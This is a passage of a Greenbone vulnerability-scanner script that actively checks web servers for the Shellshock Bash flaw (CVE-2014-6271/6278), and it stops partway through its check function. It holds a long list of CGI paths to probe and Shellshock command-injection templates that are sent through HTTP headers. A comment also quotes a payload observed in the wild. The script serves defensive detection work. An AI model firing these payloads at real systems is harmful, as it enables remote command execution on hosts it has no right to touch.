# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804489");
  script_version("2024-10-09T05:05:35+0000");
  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2024-10-09 05:05:35 +0000 (Wed, 09 Oct 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-01 21:38:00 +0000 (Mon, 01 Feb 2021)");
  script_tag(name:"creation_date", value:"2014-09-25 18:47:16 +0530 (Thu, 25 Sep 2014)");
  script_name("GNU Bash Environment Variable Handling RCE Vulnerability (Shellshock, HTTP, CVE-2014-6271/CVE-2014-6278) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  # nb: No script_mandatory_keys() for "Host/runs_windows" as this is flaw is still of a quite high
  # value and we should run against every host...

  # nb: This script had a "script_add_preference" with the id "1". If adding a new preference the
  # next id "2" needs to be used.

  script_xref(name:"URL", value:"https://access.redhat.com/security/vulnerabilities/shellshock");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70103");
  script_xref(name:"URL", value:"https://access.redhat.com/solutions/1207723");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210420171418/https://blogs.akamai.com/2014/09/environment-bashing.html");
  script_xref(name:"URL", value:"https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-shellshock-vulnerability");
  script_xref(name:"URL", value:"https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-remote-code-execution-vulnerability-cve-2014-6271");
  script_xref(name:"URL", value:"https://web.archive.org/web/20150913063755/https://shellshocker.net/");
  script_xref(name:"URL", value:"https://github.com/wreiske/shellshocker");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/252743");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"GNU Bash is prone to a remote command execution (RCE)
  vulnerability dubbed 'Shellshock'.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET and POST requests and checks
  the response.

  Note: This VT is using a default list of known affected files. To broaden the coverage of checked
  files it is possible to set the 'Enable generic web application scanning' setting within the VT
  'Global variable settings' (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes'.");

  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating
  environment variables passed from another environment. After processing a function definition,
  bash continues to process trailing strings.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote or local attackers to
  inject shell commands, allowing local privilege escalation or remote command execution depending
  on the application vector.");

  script_tag(name:"affected", value:"GNU Bash versions 1.0.3 through 4.3.");

  script_tag(name:"solution", value:"Update to patch version bash43-025 of Bash 4.3 or later.");

  script_timeout(600);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("list_array_func.inc");
include("os_func.inc");

cgis = make_list();
cgis[i++] = "/";
cgis[i++] = "/cgi-bin/authLogin.cgi";
cgis[i++] = "/cgi-bin/restore_config.cgi";
cgis[i++] = "/cgi-bin/index.cgi";
cgis[i++] = "/dasdec/dasdec.csp";
cgis[i++] = "/status";
cgis[i++] = "/cgi-bin/status";
cgis[i++] = "/index.php";
cgis[i++] = "/login.php";
cgis[i++] = "/test.cgi.php";
cgis[i++] = "/test_cgi.php";
cgis[i++] = "/cgi-bin/server.php";
cgis[i++] = "/index.pl";
cgis[i++] = "/login.pl";
cgis[i++] = "/test.cgi.pl";
cgis[i++] = "/test_cgi.pl";
cgis[i++] = "/test.cgi";
cgis[i++] = "/cgi-bin/php.fcgi";
cgis[i++] = "/cgi-bin/info.sh";
cgis[i++] = "/cgi-bin/info.cgi";
cgis[i++] = "/cgi-bin/env.cgi";
cgis[i++] = "/cgi-bin/environment.cgi";
cgis[i++] = "/cgi-bin/test.sh";
cgis[i++] = "/cgi-bin/test";
cgis[i++] = "/cgi-bin/php";
cgis[i++] = "/cgi-bin/php5";
cgis[i++] = "/cgi-sys/php5";
cgis[i++] = "/cgi-bin/php-cgi";
cgis[i++] = "/cgi-bin/printenv";
cgis[i++] = "/cgi-bin/php.cgi";
cgis[i++] = "/cgi-bin/php4";
cgis[i++] = "/cgi-bin/test-cgi";
cgis[i++] = "/cgi-bin/test.cgi";
cgis[i++] = "/cgi-bin/test.cgi.pl";
cgis[i++] = "/cgi-bin/test-cgi.pl";
cgis[i++] = "/cgi-bin/cgiinfo.cgi";
cgis[i++] = "/cgi-bin/login.cgi";
cgis[i++] = "/cgi-bin/test.cgi.php";
cgis[i++] = "/cgi-sys/entropysearch.cgi";
cgis[i++] = "/cgi-sys/defaultwebpage.cgi";
cgis[i++] = "/cgi-sys/FormMail-clone.cgi";
cgis[i++] = "/cgi-bin/search";
cgis[i++] = "/cgi-bin/search.cgi";
cgis[i++] = "/cgi-bin/whois.cgi";
cgis[i++] = "/cgi-bin/viewcvs.cgi";
cgis[i++] = "/cgi-mod/index.cgi";
cgis[i++] = "/cgi-bin/test.py";
cgis[i++] = "/cgi-bin/cgitest.py";
cgis[i++] = "/cgi-bin/ruby.rb";
cgis[i++] = "/cgi-bin/ezmlm-browse";
cgis[i++] = "/cgi-bin-sdb/printenv";
cgis[i++] = "/cgi-bin/welcome";
cgis[i++] = "/cgi-bin/helpme";
cgis[i++] = "/cgi-bin/his";
cgis[i++] = "/cgi-bin/hi";
cgis[i++] = "/cgi_wrapper";
cgis[i++] = "/admin.cgi";
cgis[i++] = "/administrator.cgi";
cgis[i++] = "/cgi-bin/guestbook.cgi";
cgis[i++] = "/tmUnblock.cgi";
cgis[i++] = "/phppath/php";
cgis[i++] = "/cgi-bin/sysinfo.pl";
cgis[i++] = "/cgi-bin/pathtest.pl";
cgis[i++] = "/cgi-bin/contact.cgi";
cgis[i++] = "/cgi-bin/uname.cgi";
cgis[i++] = "/cgi-bin/jarrewrite.sh";
# The vulnerable endpoint from https://hub.docker.com/r/vulnerables/cve-2014-6271
cgis[i++] = "/cgi-bin/vulnerable";
# The vulnerable endpoint from https://hub.docker.com/r/hmlio/vaas-cve-2014-6271/
cgis[i++] = "/cgi-bin/stats";
# The vulnerable endpoint from https://github.com/vulhub/vulhub/tree/master/bash/CVE-2014-6271
cgis[i++] = "/victim.cgi";
# The vulnerable endpoint from https://hub.docker.com/r/lizrice/shellshockable
cgis[i++] = "/cgi-bin/shockme.cgi";
# nb: Various additional ones from https://github.com/nccgroup/shocker/blob/master/shocker-cgi_list
# nb2: The list below might have already a related entry above but it was copied "as is" for easier
# maintenance of it and the list will be made "unique" later.
cgis[i++] = "/admin.cgi";
cgis[i++] = "/administrator.cgi";
cgis[i++] = "/agora.cgi";
cgis[i++] = "/aktivate/cgi-bin/catgy.cgi";
cgis[i++] = "/analyse.cgi";
cgis[i++] = "/apps/web/vs_diag.cgi";
cgis[i++] = "/axis-cgi/buffer/command.cgi";
cgis[i++] = "/b2-include/b2edit.showposts.php";
cgis[i++] = "/bandwidth/index.cgi";
cgis[i++] = "/bigconf.cgi";
cgis[i++] = "/cartcart.cgi";
cgis[i++] = "/cart.cgi";
cgis[i++] = "/ccbill/whereami.cgi";
cgis[i++] = "/cgi-bin/14all-1.1.cgi";
cgis[i++] = "/cgi-bin/14all.cgi";
cgis[i++] = "/cgi-bin/a1disp3.cgi";
cgis[i++] = "/cgi-bin/a1stats/a1disp3.cgi";
cgis[i++] = "/cgi-bin/a1stats/a1disp4.cgi";
cgis[i++] = "/cgi-bin/addbanner.cgi";
cgis[i++] = "/cgi-bin/add_ftp.cgi";
cgis[i++] = "/cgi-bin/adduser.cgi";
cgis[i++] = "/cgi-bin/admin/admin.cgi";
cgis[i++] = "/cgi-bin/admin.cgi";
cgis[i++] = "/cgi-bin/admin/getparam.cgi";
cgis[i++] = "/cgi-bin/adminhot.cgi";
cgis[i++] = "/cgi-bin/admin.pl";
cgis[i++] = "/cgi-bin/admin/setup.cgi";
cgis[i++] = "/cgi-bin/adminwww.cgi";
cgis[i++] = "/cgi-bin/af.cgi";
cgis[i++] = "/cgi-bin/aglimpse.cgi";
cgis[i++] = "/cgi-bin/alienform.cgi";
cgis[i++] = "/cgi-bin/AnyBoard.cgi";
cgis[i++] = "/cgi-bin/architext_query.cgi";
cgis[i++] = "/cgi-bin/astrocam.cgi";
cgis[i++] = "/cgi-bin/AT-admin.cgi";
cgis[i++] = "/cgi-bin/AT-generate.cgi";
cgis[i++] = "/cgi-bin/auction/auction.cgi";
cgis[i++] = "/cgi-bin/auktion.cgi";
cgis[i++] = "/cgi-bin/ax-admin.cgi";
cgis[i++] = "/cgi-bin/ax.cgi";
cgis[i++] = "/cgi-bin/axs.cgi";
cgis[i++] = "/cgi-bin/badmin.cgi";
cgis[i++] = "/cgi-bin/banner.cgi";
cgis[i++] = "/cgi-bin/bannereditor.cgi";
cgis[i++] = "/cgi-bin/bb-ack.sh";
cgis[i++] = "/cgi-bin/bb-histlog.sh";
cgis[i++] = "/cgi-bin/bb-hist.sh";
cgis[i++] = "/cgi-bin/bb-hostsvc.sh";
cgis[i++] = "/cgi-bin/bb-replog.sh";
cgis[i++] = "/cgi-bin/bb-rep.sh";
cgis[i++] = "/cgi-bin/bbs_forum.cgi";
cgis[i++] = "/cgi-bin/bigconf.cgi";
cgis[i++] = "/cgi-bin/bizdb1-search.cgi";
cgis[i++] = "/cgi-bin/blog/mt-check.cgi";
cgis[i++] = "/cgi-bin/blog/mt-load.cgi";
cgis[i++] = "/cgi-bin/bnbform.cgi";
cgis[i++] = "/cgi-bin/book.cgi";
cgis[i++] = "/cgi-bin/boozt/admin/index.cgi";
cgis[i++] = "/cgi-bin/bsguest.cgi";
cgis[i++] = "/cgi-bin/bslist.cgi";
cgis[i++] = "/cgi-bin/build.cgi";
cgis[i++] = "/cgi-bin/bulk/bulk.cgi";
cgis[i++] = "/cgi-bin/cached_feed.cgi";
cgis[i++] = "/cgi-bin/cachemgr.cgi";
cgis[i++] = "/cgi-bin/calendar/index.cgi";
cgis[i++] = "/cgi-bin/cartmanager.cgi";
cgis[i++] = "/cgi-bin/cbmc/forums.cgi";
cgis[i++] = "/cgi-bin/ccvsblame.cgi";
cgis[i++] = "/cgi-bin/c_download.cgi";
cgis[i++] = "/cgi-bin/cgforum.cgi";
cgis[i++] = "/cgi-bin/.cgi";
cgis[i++] = "/cgi-bin/cgi_process";
cgis[i++] = "/cgi-bin/classified.cgi";
cgis[i++] = "/cgi-bin/classifieds.cgi";
cgis[i++] = "/cgi-bin/classifieds/classifieds.cgi";
cgis[i++] = "/cgi-bin/classifieds/index.cgi";
cgis[i++] = "/cgi-bin/.cobalt/alert/service.cgi";
cgis[i++] = "/cgi-bin/.cobalt/message/message.cgi";
cgis[i++] = "/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi";
cgis[i++] = "/cgi-bin/commandit.cgi";
cgis[i++] = "/cgi-bin/commerce.cgi";
cgis[i++] = "/cgi-bin/common/listrec.pl";
cgis[i++] = "/cgi-bin/compatible.cgi";
cgis[i++] = "/cgi-bin/Count.cgi";
cgis[i++] = "/cgi-bin/csChatRBox.cgi";
cgis[i++] = "/cgi-bin/csGuestBook.cgi";
cgis[i++] = "/cgi-bin/csLiveSupport.cgi";
cgis[i++] = "/cgi-bin/CSMailto.cgi";
cgis[i++] = "/cgi-bin/CSMailto/CSMailto.cgi";
cgis[i++] = "/cgi-bin/csNews.cgi";
cgis[i++] = "/cgi-bin/csNewsPro.cgi";
cgis[i++] = "/cgi-bin/csPassword.cgi";
cgis[i++] = "/cgi-bin/csPassword/csPassword.cgi";
cgis[i++] = "/cgi-bin/csSearch.cgi";
cgis[i++] = "/cgi-bin/csv_db.cgi";
cgis[i++] = "/cgi-bin/cvsblame.cgi";
cgis[i++] = "/cgi-bin/cvslog.cgi";
cgis[i++] = "/cgi-bin/cvsquery.cgi";
cgis[i++] = "/cgi-bin/cvsqueryform.cgi";
cgis[i++] = "/cgi-bin/day5datacopier.cgi";
cgis[i++] = "/cgi-bin/day5datanotifier.cgi";
cgis[i++] = "/cgi-bin/db_manager.cgi";
cgis[i++] = "/cgi-bin/dbman/db.cgi";
cgis[i++] = "/cgi-bin/dcforum.cgi";
cgis[i++] = "/cgi-bin/dcshop.cgi";
cgis[i++] = "/cgi-bin/dfire.cgi";
cgis[i++] = "/cgi-bin/diagnose.cgi";
cgis[i++] = "/cgi-bin/dig.cgi";
cgis[i++] = "/cgi-bin/directorypro.cgi";
cgis[i++] = "/cgi-bin/download.cgi";
cgis[i++] = "/cgi-bin/e87_Ba79yo87.cgi";
cgis[i++] = "/cgi-bin/emu/html/emumail.cgi";
cgis[i++] = "/cgi-bin/emumail.cgi";
cgis[i++] = "/cgi-bin/emumail/emumail.cgi";
cgis[i++] = "/cgi-bin/enter.cgi";
cgis[i++] = "/cgi-bin/environ.cgi";
cgis[i++] = "/cgi-bin/ezadmin.cgi";
cgis[i++] = "/cgi-bin/ezboard.cgi";
cgis[i++] = "/cgi-bin/ezman.cgi";
cgis[i++] = "/cgi-bin/ezshopper2/loadpage.cgi";
cgis[i++] = "/cgi-bin/ezshopper3/loadpage.cgi";
cgis[i++] = "/cgi-bin/ezshopper/loadpage.cgi";
cgis[i++] = "/cgi-bin/ezshopper/search.cgi";
cgis[i++] = "/cgi-bin/faqmanager.cgi";
cgis[i++] = "/cgi-bin/FileSeek2.cgi";
cgis[i++] = "/cgi-bin/FileSeek.cgi";
cgis[i++] = "/cgi-bin/finger.cgi";
cgis[i++] = "/cgi-bin/flexform.cgi";
cgis[i++] = "/cgi-bin/fom.cgi";
cgis[i++] = "/cgi-bin/fom/fom.cgi";
cgis[i++] = "/cgi-bin/FormHandler.cgi";
cgis[i++] = "/cgi-bin/FormMail.cgi";
cgis[i++] = "/cgi-bin/gbadmin.cgi";
cgis[i++] = "/cgi-bin/gbook/gbook.cgi";
cgis[i++] = "/cgi-bin/generate.cgi";
cgis[i++] = "/cgi-bin/getdoc.cgi";
cgis[i++] = "/cgi-bin/gH.cgi";
cgis[i++] = "/cgi-bin/gm-authors.cgi";
cgis[i++] = "/cgi-bin/gm.cgi";
cgis[i++] = "/cgi-bin/gm-cplog.cgi";
cgis[i++] = "/cgi-bin/guestbook.cgi";
cgis[i++] = "/cgi-bin/handler";
cgis[i++] = "/cgi-bin/handler.cgi";
cgis[i++] = "/cgi-bin/handler/netsonar";
cgis[i++] = "/cgi-bin/hitview.cgi";
cgis[i++] = "/cgi-bin/hsx.cgi";
cgis[i++] = "/cgi-bin/html2chtml.cgi";
cgis[i++] = "/cgi-bin/html2wml.cgi";
cgis[i++] = "/cgi-bin/htsearch.cgi";
cgis[i++] = "/cgi-bin/icat";
cgis[i++] = "/cgi-bin/if/admin/nph-build.cgi";
cgis[i++] = "/cgi-bin/ikonboard/help.cgi";
cgis[i++] = "/cgi-bin/ImageFolio/admin/admin.cgi";
cgis[i++] = "/cgi-bin/imageFolio.cgi";
cgis[i++] = "/cgi-bin/index.cgi";
cgis[i++] = "/cgi-bin/infosrch.cgi";
cgis[i++] = "/cgi-bin/jammail.pl";
cgis[i++] = "/cgi-bin/journal.cgi";
cgis[i++] = "/cgi-bin/lastlines.cgi";
cgis[i++] = "/cgi-bin/loadpage.cgi";
cgis[i++] = "/cgi-bin/login.cgi";
cgis[i++] = "/cgi-bin/logit.cgi";
cgis[i++] = "/cgi-bin/log-reader.cgi";
cgis[i++] = "/cgi-bin/lookwho.cgi";
cgis[i++] = "/cgi-bin/lwgate.cgi";
cgis[i++] = "/cgi-bin/MachineInfo";
cgis[i++] = "/cgi-bin/MachineInfo";
cgis[i++] = "/cgi-bin/magiccard.cgi";
cgis[i++] = "/cgi-bin/mail/emumail.cgi";
cgis[i++] = "/cgi-bin/maillist.cgi";
cgis[i++] = "/cgi-bin/mailnews.cgi";
cgis[i++] = "/cgi-bin/mail/nph-mr.cgi";
cgis[i++] = "/cgi-bin/main.cgi";
cgis[i++] = "/cgi-bin/main_menu.pl";
cgis[i++] = "/cgi-bin/man.sh";
cgis[i++] = "/cgi-bin/mini_logger.cgi";
cgis[i++] = "/cgi-bin/mmstdod.cgi";
cgis[i++] = "/cgi-bin/moin.cgi";
cgis[i++] = "/cgi-bin/mojo/mojo.cgi";
cgis[i++] = "/cgi-bin/mrtg.cgi";
cgis[i++] = "/cgi-bin/mt.cgi";
cgis[i++] = "/cgi-bin/mt/mt.cgi";
cgis[i++] = "/cgi-bin/mt/mt-check.cgi";
cgis[i++] = "/cgi-bin/mt/mt-load.cgi";
cgis[i++] = "/cgi-bin/mt-static/mt-check.cgi";
cgis[i++] = "/cgi-bin/mt-static/mt-load.cgi";
cgis[i++] = "/cgi-bin/musicqueue.cgi";
cgis[i++] = "/cgi-bin/myguestbook.cgi";
cgis[i++] = "/cgi-bin/.namazu.cgi";
cgis[i++] = "/cgi-bin/nbmember.cgi";
cgis[i++] = "/cgi-bin/netauth.cgi";
cgis[i++] = "/cgi-bin/netpad.cgi";
cgis[i++] = "/cgi-bin/newsdesk.cgi";
cgis[i++] = "/cgi-bin/nlog-smb.cgi";
cgis[i++] = "/cgi-bin/nph-emumail.cgi";
cgis[i++] = "/cgi-bin/nph-exploitscanget.cgi";
cgis[i++] = "/cgi-bin/nph-publish.cgi";
cgis[i++] = "/cgi-bin/nph-test.cgi";
cgis[i++] = "/cgi-bin/pagelog.cgi";
cgis[i++] = "/cgi-bin/pbcgi.cgi";
cgis[i++] = "/cgi-bin/perlshop.cgi";
cgis[i++] = "/cgi-bin/pfdispaly.cgi";
cgis[i++] = "/cgi-bin/pfdisplay.cgi";
cgis[i++] = "/cgi-bin/phf.cgi";
cgis[i++] = "/cgi-bin/photo/manage.cgi";
cgis[i++] = "/cgi-bin/photo/protected/manage.cgi";
cgis[i++] = "/cgi-bin/php-cgi";
cgis[i++] = "/cgi-bin/php.cgi";
cgis[i++] = "/cgi-bin/php.fcgi";
cgis[i++] = "/cgi-bin/ping.sh";
cgis[i++] = "/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi";
cgis[i++] = "/cgi-bin/pollssi.cgi";
cgis[i++] = "/cgi-bin/postcards.cgi";
cgis[i++] = "/cgi-bin/powerup/r.cgi";
cgis[i++] = "/cgi-bin/printenv";
cgis[i++] = "/cgi-bin/probecontrol.cgi";
cgis[i++] = "/cgi-bin/profile.cgi";
cgis[i++] = "/cgi-bin/publisher/search.cgi";
cgis[i++] = "/cgi-bin/quickstore.cgi";
cgis[i++] = "/cgi-bin/quizme.cgi";
cgis[i++] = "/cgi-bin/ratlog.cgi";
cgis[i++] = "/cgi-bin/r.cgi";
cgis[i++] = "/cgi-bin/register.cgi";
cgis[i++] = "/cgi-bin/replicator/webpage.cgi/"; # nb: The trailing "/" is actually correct and the "full" URL is something like e.g. /webpage.cgi/<numbers>/<numbers>.htm
cgis[i++] = "/cgi-bin/responder.cgi";
cgis[i++] = "/cgi-bin/robadmin.cgi";
cgis[i++] = "/cgi-bin/robpoll.cgi";
cgis[i++] = "/cgi-bin/rtpd.cgi";
cgis[i++] = "/cgi-bin/sbcgi/sitebuilder.cgi";
cgis[i++] = "/cgi-bin/scoadminreg.cgi";
cgis[i++] = "/cgi-bin-sdb/printenv";
cgis[i++] = "/cgi-bin/sdbsearch.cgi";
cgis[i++] = "/cgi-bin/search";
cgis[i++] = "/cgi-bin/search.cgi";
cgis[i++] = "/cgi-bin/search/search.cgi";
cgis[i++] = "/cgi-bin/sendform.cgi";
cgis[i++] = "/cgi-bin/shop.cgi";
cgis[i++] = "/cgi-bin/shopper.cgi";
cgis[i++] = "/cgi-bin/shopplus.cgi";
cgis[i++] = "/cgi-bin/showcheckins.cgi";
cgis[i++] = "/cgi-bin/simplestguest.cgi";
cgis[i++] = "/cgi-bin/simplestmail.cgi";
cgis[i++] = "/cgi-bin/smartsearch.cgi";
cgis[i++] = "/cgi-bin/smartsearch/smartsearch.cgi";
cgis[i++] = "/cgi-bin/snorkerz.bat";
cgis[i++] = "/cgi-bin/snorkerz.bat";
cgis[i++] = "/cgi-bin/snorkerz.cmd";
cgis[i++] = "/cgi-bin/snorkerz.cmd";
cgis[i++] = "/cgi-bin/sojourn.cgi";
cgis[i++] = "/cgi-bin/spin_client.cgi";
cgis[i++] = "/cgi-bin/start.cgi";
cgis[i++] = "/cgi-bin/status";
cgis[i++] = "/cgi-bin/status_cgi";
cgis[i++] = "/cgi-bin/store/agora.cgi";
cgis[i++] = "/cgi-bin/store.cgi";
cgis[i++] = "/cgi-bin/store/index.cgi";
cgis[i++] = "/cgi-bin/survey.cgi";
cgis[i++] = "/cgi-bin/sync.cgi";
cgis[i++] = "/cgi-bin/talkback.cgi";
cgis[i++] = "/cgi-bin/technote/main.cgi";
cgis[i++] = "/cgi-bin/test2.pl";
cgis[i++] = "/cgi-bin/test-cgi";
cgis[i++] = "/cgi-bin/test.cgi";
cgis[i++] = "/cgi-bin/testing_whatever";
cgis[i++] = "/cgi-bin/test/test.cgi";
cgis[i++] = "/cgi-bin/tidfinder.cgi";
cgis[i++] = "/cgi-bin/tigvote.cgi";
cgis[i++] = "/cgi-bin/title.cgi";
cgis[i++] = "/cgi-bin/top.cgi";
cgis[i++] = "/cgi-bin/traffic.cgi";
cgis[i++] = "/cgi-bin/troops.cgi";
cgis[i++] = "/cgi-bin/ttawebtop.cgi/";
cgis[i++] = "/cgi-bin/ultraboard.cgi";
cgis[i++] = "/cgi-bin/upload.cgi";
cgis[i++] = "/cgi-bin/urlcount.cgi";
cgis[i++] = "/cgi-bin/viewcvs.cgi";
cgis[i++] = "/cgi-bin/view_help.cgi";
cgis[i++] = "/cgi-bin/viralator.cgi";
cgis[i++] = "/cgi-bin/virgil.cgi";
cgis[i++] = "/cgi-bin/vote.cgi";
cgis[i++] = "/cgi-bin/vpasswd.cgi";
cgis[i++] = "/cgi-bin/way-board.cgi";
cgis[i++] = "/cgi-bin/way-board/way-board.cgi";
cgis[i++] = "/cgi-bin/webbbs.cgi";
cgis[i++] = "/cgi-bin/webcart/webcart.cgi";
cgis[i++] = "/cgi-bin/webdist.cgi";
cgis[i++] = "/cgi-bin/webif.cgi";
cgis[i++] = "/cgi-bin/webmail/html/emumail.cgi";
cgis[i++] = "/cgi-bin/webmap.cgi";
cgis[i++] = "/cgi-bin/webspirs.cgi";
cgis[i++] = "/cgi-bin/Web_Store/web_store.cgi";
cgis[i++] = "/cgi-bin/whois.cgi";
cgis[i++] = "/cgi-bin/whois_raw.cgi";
cgis[i++] = "/cgi-bin/whois/whois.cgi";
cgis[i++] = "/cgi-bin/wrap";
cgis[i++] = "/cgi-bin/wrap.cgi";
cgis[i++] = "/cgi-bin/wwwboard.cgi.cgi";
cgis[i++] = "/cgi-bin/YaBB/YaBB.cgi";
cgis[i++] = "/cgi-bin/zml.cgi";
cgis[i++] = "/cgi-mod/index.cgi";
cgis[i++] = "/cgis/wwwboard/wwwboard.cgi";
cgis[i++] = "/cgi-sys/addalink.cgi";
cgis[i++] = "/cgi-sys/defaultwebpage.cgi";
cgis[i++] = "/cgi-sys/domainredirect.cgi";
cgis[i++] = "/cgi-sys/entropybanner.cgi";
cgis[i++] = "/cgi-sys/entropysearch.cgi";
cgis[i++] = "/cgi-sys/FormMail-clone.cgi";
cgis[i++] = "/cgi-sys/helpdesk.cgi";
cgis[i++] = "/cgi-sys/mchat.cgi";
cgis[i++] = "/cgi-sys/randhtml.cgi";
cgis[i++] = "/cgi-sys/realhelpdesk.cgi";
cgis[i++] = "/cgi-sys/realsignup.cgi";
cgis[i++] = "/cgi-sys/signup.cgi";
cgis[i++] = "/connector.cgi";
cgis[i++] = "/cp/rac/nsManager.cgi";
cgis[i++] = "/create_release.sh";
cgis[i++] = "/CSNews.cgi";
cgis[i++] = "/csPassword.cgi";
cgis[i++] = "/dcadmin.cgi";
cgis[i++] = "/dcboard.cgi";
cgis[i++] = "/dcforum.cgi";
cgis[i++] = "/dcforum/dcforum.cgi";
cgis[i++] = "/debuff.cgi";
cgis[i++] = "/debug.cgi";
cgis[i++] = "/details.cgi";
cgis[i++] = "/edittag/edittag.cgi";
cgis[i++] = "/emumail.cgi";
cgis[i++] = "/enter_buff.cgi";
cgis[i++] = "/enter_bug.cgi";
cgis[i++] = "/ez2000/ezadmin.cgi";
cgis[i++] = "/ez2000/ezboard.cgi";
cgis[i++] = "/ez2000/ezman.cgi";
cgis[i++] = "/fcgi-bin/echo";
cgis[i++] = "/fcgi-bin/echo";
cgis[i++] = "/fcgi-bin/echo2";
cgis[i++] = "/fcgi-bin/echo2";
cgis[i++] = "/Gozila.cgi";
cgis[i++] = "/hitmatic/analyse.cgi";
cgis[i++] = "/hp_docs/cgi-bin/index.cgi";
cgis[i++] = "/html/cgi-bin/cgicso";
cgis[i++] = "/html/cgi-bin/cgicso";
cgis[i++] = "/index.cgi";
cgis[i++] = "/info.cgi";
cgis[i++] = "/infosrch.cgi";
cgis[i++] = "/login.cgi";
cgis[i++] = "/mailview.cgi";
cgis[i++] = "/main.cgi";
cgis[i++] = "/megabook/admin.cgi";
cgis[i++] = "/ministats/admin.cgi";
cgis[i++] = "/mods/apage/apage.cgi";
cgis[i++] = "/_mt/mt.cgi";
cgis[i++] = "/musicqueue.cgi";
cgis[i++] = "/ncbook.cgi";
cgis[i++] = "/newpro.cgi";
cgis[i++] = "/newsletter.sh";
cgis[i++] = "/oem_webstage/cgi-bin/oemapp_cgi";
cgis[i++] = "/page.cgi";
cgis[i++] = "/parse_xml.cgi";
cgis[i++] = "/photodata/manage.cgi";
cgis[i++] = "/photo/manage.cgi";
cgis[i++] = "/print.cgi";
cgis[i++] = "/process_buff.cgi";
cgis[i++] = "/process_bug.cgi";
cgis[i++] = "/pub/english.cgi";
cgis[i++] = "/quikmail/nph-emumail.cgi";
cgis[i++] = "/quikstore.cgi";
cgis[i++] = "/reviews/newpro.cgi";
cgis[i++] = "/ROADS/cgi-bin/search.pl";
cgis[i++] = "/sample01.cgi";
cgis[i++] = "/sample02.cgi";
cgis[i++] = "/sample03.cgi";
cgis[i++] = "/sample04.cgi";
cgis[i++] = "/sampleposteddata.cgi";
cgis[i++] = "/scancfg.cgi";
cgis[i++] = "/scancfg.cgi";
cgis[i++] = "/servers/link.cgi";
cgis[i++] = "/setpasswd.cgi";
cgis[i++] = "/SetSecurity.shm";
cgis[i++] = "/shop/member_html.cgi";
cgis[i++] = "/shop/normal_html.cgi";
cgis[i++] = "/site_searcher.cgi";
cgis[i++] = "/siteUserMod.cgi";
cgis[i++] = "/submit.cgi";
cgis[i++] = "/technote/print.cgi";
cgis[i++] = "/template.cgi";
cgis[i++] = "/test.cgi";
cgis[i++] = "/ucsm/isSamInstalled.cgi";
cgis[i++] = "/upload.cgi";
cgis[i++] = "/userreg.cgi";
cgis[i++] = "/users/scripts/submit.cgi";
cgis[i++] = "/vood/cgi-bin/vood_view.cgi";
cgis[i++] = "/Web_Store/web_store.cgi";
cgis[i++] = "/webtools/bonsai/ccvsblame.cgi";
cgis[i++] = "/webtools/bonsai/cvsblame.cgi";
cgis[i++] = "/webtools/bonsai/cvslog.cgi";
cgis[i++] = "/webtools/bonsai/cvsquery.cgi";
cgis[i++] = "/webtools/bonsai/cvsqueryform.cgi";
cgis[i++] = "/webtools/bonsai/showcheckins.cgi";
cgis[i++] = "/wwwadmin.cgi";
cgis[i++] = "/wwwboard.cgi";
cgis[i++] = "/wwwboard/wwwboard.cgi";
# Kemp LoadMaster as mentioned in / via:
# https://blog.malerisch.net/2015/04/playing-with-kemp-load-master.html
cgis[i++] = "/progs/networks/hostname";
# Seems to be from a Visual Tools DVR VX16 as seen in CVE-2021-42071. But this endpoint was also
# seen in "live logs" probed by an unknown scanner like e.g. the following below in the User-Agent
# header so it was also included here just to be sure...
#
# () { :; }; echo; /bin/ping -c 6 <redacted>
#
cgis[i++] = "/cgi-bin/slogin/login.py";

function _check( url, port, host, useragent, vt_string, check_for_200, cmd, pattern ) {

  local_var url, port, host, useragent, vt_string, check_for_200, cmd, pattern;
  local_var attacks, attack, method, http_field, req, res, uid, info, report;

  if( check_for_200 ) {
    req = http_get( item:url, port:port );
    res = http_send_recv( port:port, data:req );
    if( ! res || res !~ "^HTTP/1\.[01] 200" )
      continue;
  }

  attacks = make_list( "() { " + vt_string + ":; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; " + cmd + ";",
                       "() { _; " + vt_string + "; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; " + cmd + "; }" );

  foreach attack( attacks ) {
    foreach method( make_list( "GET", "POST") ) {
      foreach http_field( make_list( "User-Agent", "Referer", "Cookie", vt_string ) ) {

        req = string( method, " ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n" );

        if( "User-Agent" >!< http_field )
